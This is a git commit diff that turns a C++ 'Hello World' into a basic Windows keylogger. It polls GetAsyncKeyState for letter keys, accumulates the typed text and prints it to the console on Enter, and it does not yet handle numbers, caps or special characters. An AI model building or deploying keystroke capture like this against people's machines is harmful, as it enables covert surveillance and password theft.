daff57bdee49c2a7c0c0860932f61cc7e629ae87
lshen365 <lshen1905@gmail.com>
2019-06-09 12:22:13 -0600

    Basic keystroke logging works, but missing all special characters, caps, and numbers

--- KeyLogger.cpp
+++ KeyLogger.cpp
@@ -1,11 +1,43 @@
 // KeyLogger.cpp : This file contains the 'main' function. Program execution begins and ends there.
 //
-
+#include <Windows.h>
 #include <iostream>
+using namespace std;
+
+
+
+//string isNumber(DWORD word) { //Checks if the key stroke is a number or a letter
+//	
+//
+//}
+string currentSentence = "";
+void findLetterTyped() {
+
+	char alphabet[26] = { 'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z' };
+	
+	DWORD word = 0x41;
+	for (int i = 0; i < 26; i++) {
+		if (GetAsyncKeyState(word) & 1) { //Loops through every single letter until it finds the one with the least bit number changed 
+			currentSentence += alphabet[i];
+		}
+
+		word++;
+		if (GetAsyncKeyState(VK_RETURN) & 1) {
+			cout << currentSentence << endl;
+			currentSentence = "";
+			return;
+		}
+	}
+
+}
+
 
 int main()
 {
-    std::cout << "Hello World!\n"; 
+	while (1) {
+		Sleep(1);
+		findLetterTyped();
+	}
 }
 
 // Run program: Ctrl + F5 or Debug > Start Without Debugging menu
